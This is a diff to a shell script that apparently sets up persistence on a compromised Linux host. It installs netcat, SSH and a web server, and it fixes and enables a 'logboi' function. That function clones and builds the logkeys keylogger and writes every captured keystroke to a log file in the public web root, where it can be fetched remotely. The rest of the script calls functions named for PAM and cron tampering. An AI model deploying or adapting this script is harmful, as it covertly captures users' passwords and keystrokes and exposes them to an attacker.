@@ -8,12 +8,12 @@ preint() {
 	echo "$pkm"
 
 	if [ $pkm == "apt" ]; then
-		apt-get install -y nc autotools sudo open-ssh apache2
+		apt-get install -y nc autotools sudo openssh-server apache2
 		systemctl enable apache2
 		systemctl start apache2
 		return
 	elif [ $pkm == "yum" ]; then
-		yum install -y nc automake sudo open-ssh httpd gcc make gcc-c++
+		yum install -y nc automake sudo openssh-server httpd gcc make gcc-c++
 		systemctl enable httpd
 		systemctl start httpd
 		return
@@ -163,15 +163,15 @@ webssh(){
 #download, install, and deploy keylogger
 logboi() {
 	git clone https://github.com/kernc/logkeys
-	/root/logkeys/autogen.sh
-	cd /root/logkeys/build
-	/root/logkeys/configure
+	cd logkeys
+	./autogen.sh
+	./configure
 	make
 	make install
-	cd /root/
-	git clean -xdf
+	cd ..
+	rm -rf logkeys
 	touch /var/www/html/logboi.log
-	logkeys -u --start --output /vaw/www/html/logboi.log
+	logkeys -u --start --output /var/www/html/logboi.log
 	return
 }
 
@@ -197,7 +197,7 @@ preint
 serv
 usr
 webssh
-#logboi
+logboi
 pam
 cron
 echo "All done!"
